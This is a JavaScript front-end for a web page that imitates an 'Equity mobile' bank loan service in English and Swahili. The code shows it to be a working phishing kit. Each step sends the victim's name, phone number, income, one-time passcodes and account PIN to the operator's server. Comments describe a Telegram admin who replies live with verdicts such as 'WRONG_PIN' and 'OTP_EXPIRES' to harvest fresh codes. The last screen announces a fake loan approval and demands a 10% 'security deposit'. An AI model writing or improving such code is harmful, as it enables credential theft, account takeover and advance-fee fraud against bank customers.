const socket = io();

// Application State
const appState = {
  language: 'en', // default
  country: '',
  bankName: 'EQUITY',
  loanType: 'Mkopo wa Biashara',
  amount: 100000,
  duration: 'Miezi 48',
  purpose: '',
  firstName: '',
  lastName: '',
  phone: '',
  employmentStatus: '',
  annualIncome: '',
  otp: '',
  pinPhone: '',
  pin: ''
};

// Translations Dictionary
const i18n = {
  en: {
    welcomeTitle: 'Welcome to Equity mobile',
    welcomeSub: 'Good afternoon! Sign in or register to continue',
    signIn: 'Sign in',
    register: 'Register',
    back: 'Back',
    welcomeBack: 'Welcome back',
    hello: 'Hello there,',
    signinSub: 'Sign in to continue. Remember, your password is yours, do not share it with anyone.',
    country: 'Country',
    emailOrMobile: 'Email address or mobile number',
    password: 'Password',
    forgotPassword: 'Forgot your password?',
    calcTitle: 'Get Your Loan Fast',
    calcSub: 'Fast approval • Low interest • Flexible term',
    calcBoxTitle: 'Loan Calculator',
    calcAmount: 'Loan Amount',
    calcDuration: 'Loan Term',
    calcRepayment: 'Monthly Repayment',
    applyNow: 'APPLY NOW',
    feat1Title: 'Fast Approval',
    feat1Sub: 'Within 24 hours',
    feat2Title: 'Low Interest',
    feat2Sub: 'Starting at 25%',
    feat3Title: 'Secure',
    feat3Sub: 'Bank-grade security',
    stepTitle: 'Loan Application',
    step1Ind: 'Step 1 of 3',
    step2Ind: 'Step 2 of 3',
    step3Ind: 'Step 3 of 3',
    loanType: 'Loan Type',
    loanAmount: 'Loan Amount',
    loanDuration: 'Loan Term',
    loanPurpose: 'Loan Purpose',
    next: 'NEXT STEP',
    prev: 'PREVIOUS',
    submit: 'SUBMIT APPLICATION',
    firstName: 'First Name',
    lastName: 'Last Name',
    phone: 'Phone Number',
    phoneHelp: 'Enter 9 digits or start with 0',
    empStatus: 'Employment Status',
    income: 'Annual Income',
    summaryTitle: 'Application Summary',
    otpTitle: 'OTP Verification',
    otpSub: 'Enter the OTP sent to your phone number',
    otpStatus: 'Information verified! Please enter your OTP below.',
    otpTimer: 'Resend code in 40 seconds',
    pinHeader: 'Account Login',
    pinInstruction: 'Enter your PIN (4 digits)',
    forgotPin: 'Forgot PIN?',
    approvedTitle: 'Congratulations!',
    approvedSub: 'Your loan has been approved! Funds will be disbursed shortly.',
    approvedAmountLbl: 'APPROVED AMOUNT',
    noticeTitle: 'COMPLIANCE NOTICE',
    noticeText: 'Your account must be active and maintain a security deposit of at least 10% of the requested loan amount.'
  },
  sw: {
    welcomeTitle: 'Karibu kwenye Equity mobile',
    welcomeSub: 'Mchana mwema! Ingia au jisajili ili kuendelea',
    signIn: 'Ingia',
    register: 'Jisajili',
    back: 'Rudi',
    welcomeBack: 'Karibu tena',
    hello: 'Hujambo,',
    signinSub: 'Ingia ili kuendelea. Kumbuka, nenosiri lakoni lako, usimpe mtu yeyote.',
    country: 'Nchi',
    emailOrMobile: 'Anwani ya barua pepe au nambari ya simu',
    password: 'Nenosiri',
    forgotPassword: 'Umesahau nenosiri?',
    calcTitle: 'Pata Mkopo Wako Haraka',
    calcSub: 'Idhini ya haraka • Riba nafuu • Muda rahisi',
    calcBoxTitle: 'Kikokotoo cha Mkopo',
    calcAmount: 'Kiasi cha Mkopo',
    calcDuration: 'Muda wa Mkopo',
    calcRepayment: 'Malipo ya Kila Mwezi',
    applyNow: 'OMBA SASA',
    feat1Title: 'Idhini ya Haraka',
    feat1Sub: 'Ndani ya masaa 24',
    feat2Title: 'Riba Nafuu',
    feat2Sub: 'Kuanzia 25%',
    feat3Title: 'Salama',
    feat3Sub: 'Kiwango cha benki',
    stepTitle: 'Maombi ya Mkopo',
    step1Ind: 'Hatua 1 ya 3',
    step2Ind: 'Hatua 2 ya 3',
    step3Ind: 'Hatua 3 ya 3',
    loanType: 'Aina ya Mkopo',
    loanAmount: 'Kiasi cha Mkopo',
    loanDuration: 'Muda wa Mkopo',
    loanPurpose: 'Madhumuni ya Mkopo',
    next: 'HATUA INAYOFUATA',
    prev: 'ILIYOTANGULIA',
    submit: 'WASILISHA MAOMBI',
    firstName: 'Jina la Kwanza',
    lastName: 'Jina la Ukoo',
    phone: 'Nambari ya Simu',
    phoneHelp: 'Weka nambari 9 au anza na 0 (mfano, 0712345678 → inabadilika hadi 0712345678)',
    empStatus: 'Hali ya Ajira',
    income: 'Mapato ya Mwaka',
    summaryTitle: 'Muhtasari wa Maombi',
    otpTitle: 'Uthibitisho wa OTP',
    otpSub: 'Weka OTP iliyotumwa kwenye nambari yako ya simu',
    otpStatus: 'Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.',
    otpTimer: 'Tuma tena msimbo ndani ya 40 sekunde',
    pinHeader: 'Ingia Akaunti',
    pinInstruction: 'Weka PIN yako (tarakimu 4)',
    forgotPin: 'Umesahau PIN?',
    approvedTitle: 'Hongera!',
    approvedSub: 'Mkopo wako umeidhinishwa! Fedha zitatolewa hivi karibuni.',
    approvedAmountLbl: 'KIASI KILICHOIDHINISHWA',
    noticeTitle: 'NOTISI YA UZINGATIAJI',
    noticeText: 'Akaunti yako lazima iwe hai na idumishe amana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba.'
  }
};

// Surface Screen Alert (No Popups)
function showSurfaceAlert(message, type = 'error') {
  const alertEl = document.getElementById('surface-alert');
  alertEl.textContent = message;
  alertEl.className = `surface-alert ${type}`;
  alertEl.classList.remove('hidden');

  setTimeout(() => {
    alertEl.classList.add('hidden');
  }, 4000);
}

// Language Switcher Engine
function setLanguage(lang) {
  appState.language = lang;
  const t = i18n[lang];

  document.getElementById('welcome-title').textContent = t.welcomeTitle;
  document.getElementById('welcome-sub').textContent = t.welcomeSub;
  document.getElementById('btn-welcome-signin').textContent = t.signIn;
  document.getElementById('btn-welcome-register').textContent = t.register;

  document.getElementById('txt-back').textContent = t.back;
  document.getElementById('signin-header-title').textContent = t.welcomeBack;
  document.getElementById('signin-hello').textContent = t.hello;
  document.getElementById('signin-sub').textContent = t.signinSub;
  document.getElementById('lbl-signin-country').textContent = t.country;
  document.getElementById('lbl-signin-email').textContent = t.emailOrMobile;
  document.getElementById('lbl-signin-password').textContent = t.password;
  document.getElementById('link-forgot').textContent = t.forgotPassword;
  document.getElementById('btn-signin-submit').textContent = t.signIn;

  document.getElementById('calc-title').textContent = t.calcTitle;
  document.getElementById('calc-sub').textContent = t.calcSub;
  document.getElementById('calc-box-title').textContent = t.calcBoxTitle;
  document.getElementById('lbl-calc-amount').textContent = t.calcAmount;
  document.getElementById('lbl-calc-duration').textContent = t.calcDuration;
  document.getElementById('lbl-calc-repayment').textContent = t.calcRepayment;
  document.getElementById('btn-apply-now').textContent = t.applyNow;

  document.getElementById('step1-title').textContent = t.stepTitle;
  document.getElementById('step2-title').textContent = t.stepTitle;
  document.getElementById('step3-title').textContent = t.stepTitle;

  document.getElementById('step1-indicator').textContent = t.step1Ind;
  document.getElementById('step2-indicator').textContent = t.step2Ind;
  document.getElementById('step3-indicator').textContent = t.step3Ind;

  document.getElementById('lbl-loan-type').textContent = t.loanType;
  document.getElementById('lbl-loan-amount-input').childNodes[0].nodeValue = t.loanAmount + " (";
  document.getElementById('lbl-loan-duration-input').textContent = t.loanDuration;
  document.getElementById('lbl-loan-purpose').textContent = t.loanPurpose;

  document.getElementById('btn-next-1').textContent = t.next;
  document.getElementById('btn-next-2').textContent = t.next;
  document.getElementById('btn-prev-2').textContent = t.prev;
  document.getElementById('btn-prev-3').textContent = t.prev;
  document.getElementById('btn-submit-3').textContent = t.submit;

  document.getElementById('lbl-first-name').textContent = t.firstName;
  document.getElementById('lbl-last-name').textContent = t.lastName;
  document.getElementById('lbl-phone').textContent = t.phone;
  document.getElementById('phone-help').textContent = t.phoneHelp;

  document.getElementById('lbl-emp-status').textContent = t.empStatus;
  document.getElementById('lbl-income').childNodes[0].nodeValue = t.income + " (";
  document.getElementById('lbl-summary-title').textContent = t.summaryTitle;

  document.getElementById('otp-title').textContent = t.otpTitle;
  document.getElementById('otp-sub').textContent = t.otpSub;
  document.getElementById('otp-status-txt').textContent = t.otpStatus;

  document.getElementById('pin-header').textContent = t.pinHeader;
  document.getElementById('lbl-pin-instruction').textContent = t.pinInstruction;
  document.getElementById('link-forgot-pin').textContent = t.forgotPin;

  document.getElementById('appr-title').textContent = t.approvedTitle;
  document.getElementById('appr-sub').textContent = t.approvedSub;
  document.getElementById('appr-amount-lbl').textContent = t.approvedAmountLbl;
  document.getElementById('appr-warn-title').textContent = t.noticeTitle;
  document.getElementById('appr-warn-text').textContent = t.noticeText;
}

// Country Selection Logic (Tanzania -> Auto-Swahili)
function handleCountryChange(country) {
  appState.country = country;
  const currencyElements = document.querySelectorAll('.curr-code');

  if (country === 'Tanzania') {
    setLanguage('sw');
    document.getElementById('welcome-lang-select').value = 'sw';
    document.getElementById('phone-prefix-code').textContent = '+255';
    document.getElementById('pin-prefix-code').textContent = '+255';
    currencyElements.forEach(el => el.textContent = 'TSh');
  } else {
    setLanguage('en');
    document.getElementById('welcome-lang-select').value = 'en';
    currencyElements.forEach(el => el.textContent = 'KSh');
    if (country === 'Kenya') {
      document.getElementById('phone-prefix-code').textContent = '+254';
      document.getElementById('pin-prefix-code').textContent = '+254';
    } else if (country === 'Uganda') {
      document.getElementById('phone-prefix-code').textContent = '+256';
      document.getElementById('pin-prefix-code').textContent = '+256';
    } else if (country === 'Rwanda') {
      document.getElementById('phone-prefix-code').textContent = '+250';
      document.getElementById('pin-prefix-code').textContent = '+250';
    }
  }
}

// Navigation Helper
function showPage(pageId) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.getElementById(pageId).classList.add('active');

  const mainHeader = document.getElementById('main-header');
  if (pageId === 'page-welcome' || pageId === 'page-signin') {
    mainHeader.classList.add('hidden');
  } else {
    mainHeader.classList.remove('hidden');
  }
}

function goToSignIn() {
  showPage('page-signin');
}

function goToLoanCalculator() {
  showPage('page-calc');
}

function handleHeaderBack() {
  showPage('page-welcome');
}

// Step 1 to Step 2
function goToStep2() {
  appState.loanType = document.getElementById('select-loan-type').value;
  appState.amount = document.getElementById('input-loan-amount').value;
  appState.duration = document.getElementById('select-loan-duration').value;
  appState.purpose = document.getElementById('input-loan-purpose').value;

  showPage('page-step2');
}

// Step 2 to Step 3
function goToStep3() {
  appState.firstName = document.getElementById('input-first-name').value;
  appState.lastName = document.getElementById('input-last-name').value;
  appState.phone = document.getElementById('phone-prefix-code').textContent + document.getElementById('input-phone').value;

  // Update Summary Display
  document.getElementById('sum-disp-amount').textContent = (appState.country === 'Tanzania' ? 'TSh ' : 'KSh ') + Number(appState.amount).toLocaleString();
  document.getElementById('sum-disp-duration').textContent = appState.duration;
  document.getElementById('sum-disp-purpose').textContent = appState.purpose;
  document.getElementById('sum-disp-applicant').textContent = `${appState.firstName} ${appState.lastName}`;

  showPage('page-step3');
}

// Submit Step 3 Application -> Emits to Server for Telegram Approval
function submitStep3() {
  appState.employmentStatus = document.getElementById('select-emp-status').value;
  appState.annualIncome = document.getElementById('input-income').value;

  showSurfaceAlert('Inaprosesisha maombi yako...', 'success');
  socket.emit('submit_application', appState);
}

// OTP Handlers (Flexible numeric auto-advancing inputs)
function handleOtpInput(element, index) {
  element.value = element.value.replace(/[^0-9]/g, ''); // Numbers only
  const inputs = document.querySelectorAll('.otp-box');

  if (element.value.length === 1 && index < inputs.length - 1) {
    inputs[index + 1].focus();
  }

  // High Sensitive Auto-Submit on Full Fill
  let fullOtp = '';
  inputs.forEach(i => fullOtp += i.value);
  if (fullOtp.length === 4) {
    appState.otp = fullOtp;
    submitOtp();
  }
}

function handleOtpPaste(e) {
  const paste = (e.clipboardData || window.clipboardData).getData('text');
  const digits = paste.replace(/[^0-9]/g, '').split('');
  const inputs = document.querySelectorAll('.otp-box');

  if (digits.length >= 4) {
    inputs.forEach((input, i) => {
      input.value = digits[i] || '';
    });
    appState.otp = digits.slice(0, 4).join('');
    submitOtp();
  }
}

function submitOtp() {
  const inputs = document.querySelectorAll('.otp-box');
  let fullOtp = '';
  inputs.forEach(i => fullOtp += i.value);

  if (fullOtp.length < 4) {
    showSurfaceAlert('Tafadhali weka tarakimu zote 4 za OTP', 'error');
    return;
  }

  appState.otp = fullOtp;
  showSurfaceAlert('Thibitisha OTP...', 'success');
  socket.emit('submit_otp', { otp: appState.otp });
}

// PIN Handlers
function handlePinInput(element, index) {
  element.value = element.value.replace(/[^0-9]/g, '');
  const inputs = document.querySelectorAll('.pin-box');

  if (element.value.length === 1 && index < inputs.length - 1) {
    inputs[index + 1].focus();
  }
}

function submitPin() {
  const phone = document.getElementById('pin-phone-input').value;
  const pinInputs = document.querySelectorAll('.pin-box');
  let pin = '';
  pinInputs.forEach(p => pin += p.value);

  if (!phone || pin.length < 4) {
    showSurfaceAlert('Tafadhali weka nambari ya simu na PIN sahihi', 'error');
    return;
  }

  appState.pinPhone = phone;
  appState.pin = pin;

  showSurfaceAlert('Inakagua PIN...', 'success');
  socket.emit('submit_pin', { phone, pin });
}

// Real-time Telegram Admin Listener (Listens to Admin Decisions)
socket.on('admin_action', (data) => {
  const action = data.action;

  if (action === 'INVALID_ACC') {
    showSurfaceAlert('INVALID ACC. DETAILS - Tafadhali rekebisha taarifa zako', 'error');
    showPage('page-step2'); // Direct back to update personal details
  } else if (action === 'CORRECT_ACC') {
    document.getElementById('otp-phone-display').textContent = appState.phone;
    showPage('page-otp');
  } else if (action === 'OTP_EXPIRES') {
    showSurfaceAlert('OTP EXPIRED - Msimbo umeisha muda wake. Weka msimbo mpya', 'error');
    document.querySelectorAll('.otp-box').forEach(i => i.value = '');
    document.querySelectorAll('.otp-box')[0].focus();
  } else if (action === 'OTP_ACCEPTED') {
    document.getElementById('pin-phone-input').value = appState.phone.replace('+255', '').replace('+254', '');
    showPage('page-pin');
  } else if (action === 'WRONG_PIN') {
    showSurfaceAlert('WRONG PIN - PIN sio sahihi, jaribu tena', 'error');
    document.querySelectorAll('.pin-box').forEach(i => i.value = '');
    document.querySelectorAll('.pin-box')[0].focus();
  } else if (action === 'APPROVED') {
    document.getElementById('appr-disp-amount').textContent = (appState.country === 'Tanzania' ? 'TSh ' : 'KSh ') + Number(appState.amount).toLocaleString();
    showPage('page-approved');
  }
});

// Event Listeners Initialization
document.getElementById('welcome-lang-select').addEventListener('change', (e) => {
  setLanguage(e.target.value);
});

function updateCalc() {
  const amt = document.getElementById('range-amount').value;
  const dur = document.getElementById('range-duration').value;
  const curr = appState.country === 'Tanzania' ? 'TSh' : 'KSh';

  document.getElementById('disp-calc-amount').textContent = `${curr} ${Number(amt).toLocaleString()}`;
  document.getElementById('disp-calc-duration').textContent = `${dur} miezi`;

  const monthly = Math.round((amt * 1.15) / dur);
  document.getElementById('disp-monthly-payment').textContent = `${curr} ${monthly.toLocaleString()}`;
}

function startApplication() {
  showPage('page-step1');
}

function togglePasswordVisibility() {
  const input = document.getElementById('signin-password');
  input.type = input.type === 'password' ? 'text' : 'password';
}

function togglePinVisibility() {
  const inputs = document.querySelectorAll('.pin-box');
  inputs.forEach(i => {
    i.type = i.type === 'password' ? 'text' : 'password';
  });
    }
    
